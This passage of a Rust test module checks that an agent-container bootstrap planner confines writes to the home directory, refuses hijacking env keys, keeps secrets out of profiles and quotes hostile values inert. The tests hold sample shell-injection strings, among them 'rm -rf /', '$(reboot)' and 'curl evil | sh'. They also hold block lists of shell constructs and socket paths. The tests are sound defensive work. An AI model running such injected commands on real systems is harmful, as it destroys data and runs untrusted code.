            .iter()
            .filter_map(|s| match s {
                BootstrapStep::Mkdir { paths }
                    if paths.iter().any(|p| p.contains(".rust/toolchains")) =>
                {
                    Some(paths)
                }
                _ => None,
            })
            .collect();
        assert_eq!(mkdirs.len(), 1);
        assert_eq!(
            mkdirs[0],
            &[
                "/home/1001/.cargo/bin".to_owned(),
                "/home/1001/.rustup".to_owned(),
                toolchain.to_owned()
            ]
        );
        // nvm/node strip 1 into their own roots (single top-level dir each).
        for (file, dest) in [
            ("nvm-0.40.8.tar.gz", "/home/1001/.nvm"),
            (
                "node-v22.23.3-linux-x64-musl.tar.xz",
                "/home/1001/.nvm/versions/node/v22.23.3",
            ),
        ] {
            match plan
                .steps
                .iter()
                .find(|s| matches!(s, BootstrapStep::Extract { file: f, .. } if f == file))
                .expect("nvm/node extraction")
            {
                BootstrapStep::Extract {
                    dest: d, strip: n, ..
                } => {
                    assert_eq!(d, dest, "{file}");
                    assert_eq!(*n, 1, "{file} strips its single top-level dir");
                }
                other => panic!("unexpected step {other:?}"),
            }
        }
        // pixi's release tarball has no wrapper dir: strip 0 into its bin/.
        match plan
            .steps
            .iter()
            .find(|s| matches!(s, BootstrapStep::Extract { file, .. } if file.starts_with("pixi-")))
            .expect("pixi extraction")
        {
            BootstrapStep::Extract { dest, strip, .. } => {
                assert_eq!(dest, "/home/1001/.pixi/bin");
                assert_eq!(*strip, 0);
            }
            other => panic!("unexpected step {other:?}"),
        }
    }

    /// Adversarial: nothing bootstrap does may write outside the parcel home
    /// or the pkgcache mirror — no `/var/git`, `/var/context`, `/usr`, `/etc`,
    /// `/var/mail`, `/var/freight`, and never another UID's home.
    #[test]
    fn no_step_writes_outside_home_or_mirror() {
        for uid in [1001u32, 1002, 2000] {
            let plan = plan_bootstrap(uid, &blueprint(), &pins(), &BTreeSet::new()).expect("plan");
            let mirror = mirror_dir();
            let allowed = [format!("/home/{uid}/"), format!("{mirror}/")];
            for step in &plan.steps {
                for arg in step.argv() {
                    if !arg.starts_with('/') {
                        continue; // flags, tool names, URLs (checked below)
                    }
                    assert!(
                        allowed.iter().any(|prefix| arg.starts_with(prefix)),
                        "uid {uid}: {arg:?} is outside the home/mirror (step {:?})",
                        step.label()
                    );
                }
                // ro mounts and infrastructure paths must not appear at all.
                let joined = step.argv().join(" ");
                for forbidden in [
                    "/var/git",
                    "/var/context",
                    "/var/mail",
                    "/var/freight",
                    "/etc/",
                    "/usr/",
                    "/run/",
                    "podman.sock",
                    "docker.sock",
                ] {
                    assert!(
                        !joined.contains(forbidden),
                        "uid {uid}: {forbidden} in {joined}"
                    );
                }
                // No other slot's home is reachable from this plan.
                for other in [1000u32, 1001, 1002, 2000] {
                    if other != uid {
                        assert!(
                            !joined.contains(&format!("/home/{other}")),
                            "uid {uid} plan touches /home/{other}: {joined}"
                        );
                    }
                }
            }
            // Downloads go to pinned https URLs only.
            for step in &plan.steps {
                if let BootstrapStep::Download { url, .. } = step {
                    assert!(url.starts_with("https://"), "{url}");
                }
            }
        }
    }

    /// Adversarial: no step is a shell, and no inner command can be read as
    /// an option by the `env` prefix (flag injection through argv).
    #[test]
    fn no_step_is_a_shell_and_no_inner_flag_injection() {
        let plan = cold_plan();
        for step in &plan.steps {
            let argv = step.argv();
            assert!(!argv.is_empty());
            let joined = argv.join(" ");
            for forbidden in [
                "sh -c", "bash", "/bin/sh", " -c ", "&&", "||", ";", "$(", "`",
            ] {
                assert!(
                    !joined.contains(forbidden),
                    "shell construct {forbidden:?} in {joined}"
                );
            }
            assert!(
                !argv[0].starts_with('-'),
                "argv[0] must be a program, not a flag: {joined}"
            );
            for arg in &argv {
                assert!(
                    !arg.is_empty() && !arg.chars().any(char::is_control),
                    "{joined}"
                );
            }
            // Composed with the env prefix, the inner command is still a program.
            let mut full = plan.env_prefix();
            full.extend(argv);
            validate_inner_argv(&full, plan.env_prefix().len()).expect("composed argv is valid");
        }
        // A leading-dash inner command is caught (env would read it as an option).
        let bad = vec![
            "env".to_owned(),
            "HOME=/home/1001".to_owned(),
            "--version".to_owned(),
        ];
        assert!(validate_inner_argv(&bad, 2).is_err());
        // Control characters and empty args are caught too.
        assert!(validate_inner_argv(&["env".into(), "a\nb".into()], 0).is_err());
        assert!(validate_inner_argv(&["env".into(), String::new()], 0).is_err());
    }

    // -----------------------------------------------------------------------
    // Env policy (ADR-0014)
    // -----------------------------------------------------------------------

    /// The env prefix carries the derived structural vars only (sorted), and
    /// always includes PATH with the image default suffix so `tar`/`curl`
    /// resolve without depending on the container env.
    #[test]
    fn env_prefix_is_structural_sorted_and_self_sufficient() {
        let plan = cold_plan();
        let prefix = plan.env_prefix();
        assert_eq!(prefix[0], "env");
        let assignments: Vec<&str> = prefix[1..].iter().map(String::as_str).collect();
        let keys: Vec<&str> = assignments
            .iter()
            .map(|a| a.split('=').next().unwrap())
            .collect();
        let mut sorted = keys.clone();
        sorted.sort();
        assert_eq!(keys, sorted, "sorted (BTreeMap iteration)");
        assert_eq!(
            keys,
            [
                "CARGO_HOME",
                "HAMLET_BLUEPRINT",
                "HAMLET_BLUEPRINT_VERSION",
                "HAMLET_TOOLCHAIN_MANIFEST",
                "HOME",
                "NVM_DIR",
                "PATH",
                "PIXI_HOME",
                "RUSTUP_HOME"
            ]
        );
        let path = assignments
            .iter()
            .find(|a| a.starts_with("PATH="))
            .expect("PATH is derived");
        assert!(path.ends_with(IMAGE_DEFAULT_PATH), "{path}");
        assert!(path.contains("/home/1001/.pixi/bin"));
        assert!(path.contains("/home/1001/.nvm/versions/node/v22.23.3/bin"));
        assert!(path.contains("/home/1001/.cargo/bin"));
        // Blueprint [env] is NOT in the prefix — it already rides along in
        // `podman run -e` (and lands in the profile for login shells).
        assert!(!assignments.iter().any(|a| a.starts_with("LANG=")));
    }

    /// Adversarial: a blueprint (including one promoted from a DEED block by
    /// Sprint 06) may not set structural or loader-hijacking env keys.
    #[test]
    fn env_policy_refuses_structural_and_loader_keys() {
        for (key, value) in [
            ("CARGO_HOME", "/var/pkgcache/cargo"),
            ("RUSTUP_HOME", "/home/1001/.rustup"),
            ("PIXI_HOME", "/home/1001/.pixi"),
            ("NVM_DIR", "/home/1001/.nvm"),
            ("HOME", "/tmp"),
            ("PATH", "/tmp/bin"),
            ("HAMLET_BLUEPRINT", "evil"),
        ] {
            let err = plan_bootstrap(
                UID,
                &blueprint_with_env(&format!("{key} = \"{value}\"")),
                &pins(),
                &BTreeSet::new(),
            )
            .expect_err("{key} must be refused");
            assert!(
                matches!(&err, BootstrapError::ForbiddenEnvKey { key: k, .. } if k == key),
                "{key}: {err}"
            );
        }
        for key in FORBIDDEN_ENV_KEYS {
            let err = plan_bootstrap(
                UID,
                &blueprint_with_env(&format!("{key} = \"/var/pkgcache/evil.so\"")),
                &pins(),
                &BTreeSet::new(),
            )
            .expect_err("{key} must be refused");
            assert!(
                matches!(&err, BootstrapError::ForbiddenEnvKey { key: k, .. } if k == key),
                "{key}: {err}"
            );
        }
    }

    /// Adversarial: no env value may point into a shared mount unless it is a
    /// declared cache key into `/var/pkgcache/`. This is what stops a promoted
    /// blueprint from parking an executable prefix (or `PYTHONPATH`) where any
    /// other UID can write.
    #[test]
    fn env_policy_refuses_shared_mount_prefixes_but_allows_caches() {
        for (key, value) in [
            ("PYTHONPATH", "/var/freight/drop"),
            ("NODE_OPTIONS", "/var/mail/1002/x"),
            ("GIT_EXEC_PATH", "/var/pkgcache/git"),
            ("SOME_PREFIX", "/var/git/hooks"),
            ("OTHER", "/var/context"),
        ] {
            let err = plan_bootstrap(
                UID,
                &blueprint_with_env(&format!("{key} = \"{value}\"")),
                &pins(),
                &BTreeSet::new(),
            )
            .expect_err("{key}={value} must be refused");
            assert!(
                matches!(&err, BootstrapError::SharedMountEnvValue { key: k, .. } if k == key),
                "{key}: {err}"
            );
        }
        // The default blueprint's cache keys are exactly what IS allowed.
        let plan = cold_plan();
        for key in CACHE_ENV_KEYS {
            assert!(
                plan.env.passthrough.contains_key(key),
                "{key} passes through (cache semantics on the rw pkgcache mount)"
            );
        }
        assert_eq!(
            plan.env
                .passthrough
                .get("PIXI_CACHE_DIR")
                .map(String::as_str),
            Some("/var/pkgcache/pixi")
        );
        // A cache key pointing at a NON-pkgcache shared mount is still refused.
        assert!(matches!(
            plan_bootstrap(
                UID,
                &blueprint_with_env("PIP_CACHE_DIR = \"/var/freight/pip\""),
                &pins(),
                &BTreeSet::new()
            )
            .unwrap_err(),
            BootstrapError::SharedMountEnvValue { .. }
        ));
    }

    /// The uid policy fires before any planning: only subagent slots get a
    /// bootstrapped home (the Mayor's manor is a different flow).
    #[test]
    fn uid_policy_is_enforced_before_any_step() {
        for uid in [0u32, 1, 999, 1000, 2001, u32::MAX] {
            let err = plan_bootstrap(uid, &blueprint(), &pins(), &BTreeSet::new())
                .err()
                .unwrap_or_else(|| panic!("uid {uid} must be refused"));
            assert!(
                matches!(err, BootstrapError::UidPolicy { uid: u } if u == uid),
                "{err}"
            );
        }
        for uid in [FIRST_AGENT_UID, 1500, LAST_AGENT_UID] {
            assert!(plan_bootstrap(uid, &blueprint(), &pins(), &BTreeSet::new()).is_ok());
        }
        // The target type enforces the same rule before any side effect.
        let identity = sanitize_name("scribe").unwrap();
        assert!(BootstrapTarget::new(identity.clone(), FIRST_AGENT_UID).is_ok());
        for uid in [0u32, 1000, 2001] {
            assert!(
                matches!(BootstrapTarget::new(identity.clone(), uid).unwrap_err(),
                    BootstrapError::UidPolicy { uid: u } if u == uid),
                "target uid {uid}"
            );
        }
        assert_eq!(
            BootstrapTarget::new(identity, 1001).unwrap().container(),
            "scribe",
            "the container name is the identity (RunSpec::for_agent)"
        );
    }

    /// An unpinned tool is refused with the exact triple that has no pin —
    /// bootstrap never guesses a version or a URL (ADR-0012 cl. 4).
    #[test]
    fn unpinned_tools_are_refused_not_guessed() {
        let bp = Blueprint::from_toml(
            r#"
[meta]
name = "unpinned"
version = 1
base_image = "docker.io/library/alpine:3.24"

[[tools]]
kind = "pixi"
name = "python"
version_spec = "3.12.*"
"#,
        )
        .unwrap();
        let err = plan_bootstrap(UID, &bp, &pins(), &BTreeSet::new()).unwrap_err();
        assert!(
            matches!(&err, BootstrapError::UnpinnedTool { kind: ToolKind::Pixi, name, version_spec }
                if name == "python" && version_spec.as_deref() == Some("3.12.*")),
            "{err}"
        );
        assert!(
            err.to_string().contains("defaults/toolchain-pins.toml"),
            "{err}"
        );
        // A pinned spec that differs only in the version is still unpinned
        // (exact match: floating specs are frozen by the table).
        let bp = Blueprint::from_toml(
            r#"
[meta]
name = "drift"
version = 1
base_image = "docker.io/library/alpine:3.24"

[[tools]]
kind = "nvm"
name = "node"
version_spec = "24"
"#,
        )
        .unwrap();
        assert!(matches!(
            plan_bootstrap(UID, &bp, &pins(), &BTreeSet::new()).unwrap_err(),
            BootstrapError::UnpinnedTool { .. }
        ));
        // apk-only blueprints need no pins at all (image layer).
        let bp = Blueprint::from_toml(
            r#"
[meta]
name = "apk-only"
version = 1
base_image = "docker.io/library/alpine:3.24"

[[tools]]
kind = "apk"
name = "ripgrep"
"#,
        )
        .unwrap();
        let plan = plan_bootstrap(UID, &bp, &pins(), &BTreeSet::new()).unwrap();
        assert!(plan.tools.is_empty());
        assert!(apk_packages(&bp).contains(&"ripgrep".to_owned()));
        assert!(!plan.steps.iter().any(|s| s.is_download()));
        assert!(plan
            .env
            .structural
            .get("PATH")
            .unwrap()
            .ends_with(IMAGE_DEFAULT_PATH));
    }

    // -----------------------------------------------------------------------
    // Profile / manifest / DEED
    // -----------------------------------------------------------------------

    /// Golden vector: the exact `.profile` bytes for the default blueprint.
    #[test]
    fn profile_golden() {
        let plan = cold_plan();
        assert_eq!(
            plan.profile,
            "# hamlet parcel profile — GENERATED by hamlet-daemon bootstrap (ADR-0012).\n\
             # parcel1001 · blueprint village-alpine v1 · image localhost/hamlet/village-alpine:v1-f2-c0a8b8a8b1160d5c8\n\
             #\n\
             # Rewritten whenever the blueprint or the pin table changes; hand edits are\n\
             # lost. Secrets are NEVER written here — they are injected at session start\n\
             # (SPEC §11.4) and stay out of every parcel home.\n\
             #\n\
             # Sourced by login shells (busybox ash reads ~/.profile for `sh -l`), which is\n\
             # how the daemon must start agent sessions (Sprint 03).\n\
             \n\
             export CARGO_HOME='/home/1001/.cargo'\n\
             export HAMLET_BLUEPRINT='village-alpine'\n\
             export HAMLET_BLUEPRINT_VERSION='1'\n\
             export HAMLET_TOOLCHAIN_MANIFEST='/home/1001/.hamlet/toolchain.json'\n\
             export HOME='/home/1001'\n\
             export NVM_DIR='/home/1001/.nvm'\n\
             export PATH='/home/1001/.pixi/bin:/home/1001/.nvm/versions/node/v22.23.3/bin:/home/1001/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'\n\
             export PIXI_HOME='/home/1001/.pixi'\n\
             export RUSTUP_HOME='/home/1001/.rustup'\n\
             \n\
             # blueprint [env] — non-secret defaults from village-alpine v1\n\
             export LANG='C.UTF-8'\n\
             export NPM_CONFIG_CACHE='/var/pkgcache/npm'\n\
             export PIP_CACHE_DIR='/var/pkgcache/pip'\n\
             export PIXI_CACHE_DIR='/var/pkgcache/pixi'\n\
             \n\
             # nvm as a shell function (SPEC §4: agents self-extend from the home)\n\
             if [ -s \"$NVM_DIR/nvm.sh\" ]; then . \"$NVM_DIR/nvm.sh\"; fi\n"
        );
        // Every derived install root is exported into the HOME, never a
        // shared mount (SPEC §4: multiplexers live in /home/<uid>/).
        for key in ["CARGO_HOME", "RUSTUP_HOME", "PIXI_HOME", "NVM_DIR", "HOME"] {
            let line = plan
                .profile
                .lines()
                .find(|l| l.starts_with(&format!("export {key}=")))
                .unwrap_or_else(|| panic!("{key} missing"));
            assert!(line.contains("'/home/1001"), "{line}");
            assert!(!line.contains("/var/pkgcache"), "{line}");
        }
    }

    /// Adversarial: a hostile blueprint env value is quoted inert — it can
    /// never become shell in a later login session.
    #[test]
    fn profile_quotes_hostile_values_inert() {
        assert_eq!(sh_quote("plain"), "'plain'");
        assert_eq!(sh_quote("it's"), "'it'\\''s'");
        assert_eq!(sh_quote(""), "''");
        for hostile in [
            "x'; rm -rf / ;'",
            "$(reboot)",
            "`id`",
            "\"; curl evil | sh; \"",
            "${IFS}x",
        ] {
            let quoted = sh_quote(hostile);
            assert!(
                quoted.starts_with('\'') && quoted.ends_with('\''),
                "{quoted}"
            );
            // Inside single quotes nothing is special; the only escape is the
            // '\'' sequence, so a bare `$(`, backtick or `;` can't act.
            let inner = &quoted[1..quoted.len() - 1];
            assert!(
                inner.replace("'\\''", "").chars().all(|c| c != '\''),
                "no unescaped quote survives: {quoted}"
            );
            let bp = blueprint_with_env(&format!("HOSTILE = {hostile:?}"));
            // core rejects values with control chars; these are all printable.
            if let Ok(plan) = plan_bootstrap(UID, &bp, &pins(), &BTreeSet::new()) {
                assert!(
                    plan.profile
                        .contains(&format!("export HOSTILE={}", sh_quote(hostile))),
                    "{}",
                    plan.profile
                );
            }
        }
    }

    /// SPEC §11.4: secrets are injected at session start, never baked into a
    /// home. No secret-shaped key can reach the profile, manifest, or DEED.
    #[test]
    fn profile_never_carries_secrets() {
        // The same shape ADR-0009 rejects in `[env]`, checked here without
        // pulling `regex` into the daemon (the stack is locked).
        let secret_shaped = |key: &str| {
            let lower = key.to_ascii_lowercase();
            ["key", "secret", "token", "passw", "credential"]
                .iter()
                .any(|needle| lower.contains(needle))
        };
        let plan = cold_plan();
        // core refuses secret-shaped [env] keys, so the plan can't contain one;
        // assert it end to end anyway (defense in depth).
        for key in plan.env.keys() {
            assert!(!secret_shaped(&key), "{key} is secret-shaped");
        }
        for line in plan.profile.lines() {
            if let Some(rest) = line.strip_prefix("export ") {
                let key = rest.split('=').next().unwrap();
                assert!(!secret_shaped(key), "{key} in the profile");
            }
        }
        // Env is recorded as KEYS only: no `K=V`, no blueprint value, and no
        // `env` object at all (SPEC §11.4 — values never leave the home).
        assert!(!plan.manifest.contains('='), "no K=V pairs in the manifest");
        for value in plan.env.passthrough.values() {
            assert!(
                !plan.manifest.contains(value.as_str()),
                "manifest records env KEYS only, never {value:?}"
            );
        }
        let parsed: serde_json::Value = serde_json::from_str(&plan.manifest).unwrap();
        assert!(parsed.get("env").is_none(), "only env_keys is recorded");
        assert!(parsed["env_keys"].is_array());
        // The DEED baseline records keys only as well.
        let entry = deed_baseline_entry(UID, &plan, &"a".repeat(64));
        assert!(entry.contains("env keys: "));
        assert!(!entry.contains("C.UTF-8"), "no env value in DEED.md");
        assert!(
            !entry.contains("/var/pkgcache/pixi"),
            "no env value in DEED.md"
        );
    }

    /// The manifest is canonical JSON: sorted keys, per-tool digests, and no
    /// env values (SPEC §11.1 discipline applied to the home record).
    #[test]
    fn manifest_is_canonical_and_value_free() {
        let plan = cold_plan();
        let value: serde_json::Value = serde_json::from_str(&plan.manifest).expect("valid JSON");
        let obj = value.as_object().expect("object");
        let keys: Vec<&String> = obj.keys().collect();
        let mut sorted = keys.clone();
        sorted.sort();
        assert_eq!(keys, sorted, "serde_json renders BTreeMap order");
        assert_eq!(obj["manifest_version"], MANIFEST_SCHEMA_VERSION);
        assert_eq!(obj["floor_version"], FLOOR_VERSION);
        assert_eq!(obj["pins_version"], pins().version());
        assert_eq!(obj["uid"], 1001);
        assert_eq!(obj["image"], plan.image);
        assert_eq!(obj["blueprint"]["name"], "village-alpine");
        assert_eq!(
            obj["blueprint"]["base_image"],
            "docker.io/library/alpine:3.24"
        );
        let tools = obj["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 3);
        assert_eq!(tools[0]["kind"], "pixi");
        assert_eq!(tools[1]["kind"], "nvm");
        assert_eq!(tools[2]["kind"], "cargo");
        assert_eq!(tools[2]["artifacts"].as_array().unwrap().len(), 4);
        // Every artifact digest is recorded — the manifest is the parcel's
        // supply-chain evidence.
        let digests: Vec<&str> = tools
            .iter()
            .flat_map(|t| t["artifacts"].as_array().unwrap())
            .map(|a| a["sha256"].as_str().unwrap())
            .collect();
        assert_eq!(digests.len(), 7);
        assert!(digests.iter().all(|d| d.len() == 64));
        // Env is keys only.
        let env_keys = obj["env_keys"].as_array().unwrap();
        assert!(env_keys.iter().any(|k| k == "CARGO_HOME"));
        assert!(!plan.manifest.contains("C.UTF-8"));
        assert!(plan.manifest.ends_with("}\n"));
    }

    /// Golden vector: the DEED.md baseline entry (SPEC §9.4 — Sprint 06 must
    /// parse this shape and treat it as the environment floor).
    #[test]
    fn deed_baseline_entry_golden() {
        let plan = cold_plan();
        let sha = "b".repeat(64);
        let entry = deed_baseline_entry(UID, &plan, &sha);
        let lines: Vec<&str> = entry.lines().collect();
        assert_eq!(lines.len(), 7, "{entry}");
        assert_eq!(
            lines[0],
            format!("- {DEED_BASELINE_MARKER} · uid 1001 · image {}", plan.image)
        );
        assert_eq!(
            lines[1],
            format!("  - manifest: /home/1001/.hamlet/toolchain.json · sha256 {sha}")
        );
        assert!(
            lines[2].starts_with("  - tool: pixi/pixi 0.34.* → 0.34.0 · primary@0.34.0 sha256 ")
        );
        assert!(lines[3].starts_with("  - tool: nvm/node 22 → 22.23.3 · manager@0.40.8 sha256 "));
        assert!(
            lines[4].starts_with("  - tool: cargo/rust stable → 1.98.1 · rustup@1.29.1 sha256 ")
        );
        assert_eq!(
            lines[5],
            "  - image layer (apk): acl, ca-certificates, curl, git, gzip, libgcc, libstdc++, tar, uutils-coreutils, xz"
        );
        assert!(lines[6].starts_with("  - env keys: CARGO_HOME, "));
        assert!(lines[6].ends_with("(values never recorded — SPEC §11.4)"));
        assert!(entry.ends_with('\n'));

        // The idempotence check keys on the manifest digest line.
        let deed =
            format!("# DEED — environment record · parcel1001\n\n### Dynamic Alterations\n{entry}");
        assert!(deed_has_baseline(&deed, UID, &sha));
        assert!(!deed_has_baseline(&deed, UID, &"c".repeat(64)));
        assert!(!deed_has_baseline(&deed, 1002, &sha));
        assert!(!deed_has_baseline("### Dynamic Alterations\n", UID, &sha));
    }

    /// `sha256sum` output parsing: both the text and binary-mode forms, and
    /// nothing else (a truncated/uppercase/garbage answer is an error, never a
    /// silent pass).
    #[test]
    fn digest_parsing_is_strict() {
        let sha = "a".repeat(64);
        assert_eq!(
            parse_digest(&format!("{sha}  /home/1001/x.tar.gz\n")),
            Some(sha.clone())
        );
        assert_eq!(
            parse_digest(&format!("{sha} */home/1001/x.bin")),
            Some(sha.clone())
        );
        assert_eq!(parse_digest(""), None);
        assert_eq!(parse_digest("nope"), None);
        assert_eq!(parse_digest(&format!("{}  x", "A".repeat(64))), None);
        assert_eq!(parse_digest(&format!("{}0  x", sha)), None);
        assert_eq!(parse_digest("sha256sum: no such file"), None);
    }

    /// `atomic_write` (ADR-0006): content, canonical mode, no temp litter.
    #[test]
    fn atomic_write_leaves_no_litter() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("DEED.md");
        fs::write(&path, "old").unwrap();
        atomic_write(&path, "new\n").unwrap();
        assert_eq!(fs::read_to_string(&path).unwrap(), "new\n");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o7777;
            assert_eq!(mode, 0o644);
        }
        let entries: Vec<_> = fs::read_dir(tmp.path())
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        assert_eq!(
            entries,
            vec![std::ffi::OsString::from("DEED.md")],
            "no temp litter"
        );
    }

    /// In-container path helpers are the SPEC §4 literals (derived from the
    /// typed mount table, never ad-hoc).
    #[test]
    fn container_paths_come_from_the_mount_table() {
        assert_eq!(pkgcache_dir(), "/var/pkgcache");
        assert_eq!(mirror_dir(), "/var/pkgcache/dist");
        assert_eq!(hamlet_home_dir(1001), "/home/1001/.hamlet");
        assert_eq!(stage_dir(1001), "/home/1001/.hamlet/stage");
        assert_eq!(manifest_path(1001), "/home/1001/.hamlet/toolchain.json");
        assert_eq!(profile_path(1001), "/home/1001/.profile");
        assert_eq!(
            staged_path(1001, "x.tar.gz"),
            "/home/1001/.hamlet/stage/x.tar.gz"
        );
        assert_eq!(mirror_path("x.tar.gz"), "/var/pkgcache/dist/x.tar.gz");
        assert_eq!(
            shared_mount_roots(),
            [
                "/var/mail",
                "/var/freight",
                "/var/git",
                "/var/pkgcache",
                "/var/context"
            ]
        );
    }
}
